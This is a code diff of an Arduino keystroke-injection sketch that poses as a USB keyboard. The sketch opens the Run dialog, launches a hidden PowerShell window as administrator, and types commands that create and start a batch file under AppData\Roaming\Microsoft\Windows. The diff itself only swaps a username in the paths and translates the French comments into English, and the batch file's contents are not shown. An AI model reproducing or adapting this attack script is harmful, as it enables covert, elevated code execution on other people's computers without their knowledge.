@@ -21,7 +21,7 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(200);
-  Keyboard.print("\Start-Process -FilePath \"C:\\Users\\theob\\AppData");
+  Keyboard.print("\Start-Process -FilePath \"C:\\Users\\alice\\AppData");
   delay(100);
   Keyboard.print("\\Roaming\\Microsoft\\Windows");
   delay(100);
@@ -34,7 +34,7 @@ void setup() {
   Keyboard.release(KEY_RETURN);
   Keyboard.releaseAll();
 
-  // Fermer le clavier virtuel.
+  // Close the virtual keyboard.
   Keyboard.end();
 
 }
@@ -46,7 +46,7 @@ void loop() {
 
 void createfile(){
   
-  Keyboard.print("$batFilePath = \"C:\\Users\\theob\\AppData");
+  Keyboard.print("$batFilePath = \"C:\\Users\\alice\\AppData");
     delay(100);
   Keyboard.print("\\Roaming\\Microsoft\\Windows");
     delay(100);
@@ -65,16 +65,16 @@ void createfile(){
 }
 
 void powershell(){
-   // Simuler la pression de la touche Windows.
+   // Simulate the Windows key press.
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
-  Keyboard.releaseAll(); // Relâcher toutes les touches.
+  Keyboard.releaseAll(); // Release all keys.
 
-  // Attendre que la boîte de dialogue Exécuter s'ouvre.
+  // Wait for the Run dialog box to open.
   delay(80);
 
-  // Taper "powershell" puis appuyer sur Ctrl+Shift+Entrée pour ouvrir PowerShell en tant qu'administrateur.
+  // Type "powershell" then press Ctrl+Shift+Enter to open PowerShell as administrator.
   Keyboard.print("powershell -WindowStyle Hidden");
   delay(100);
   Keyboard.press(KEY_LEFT_CTRL);
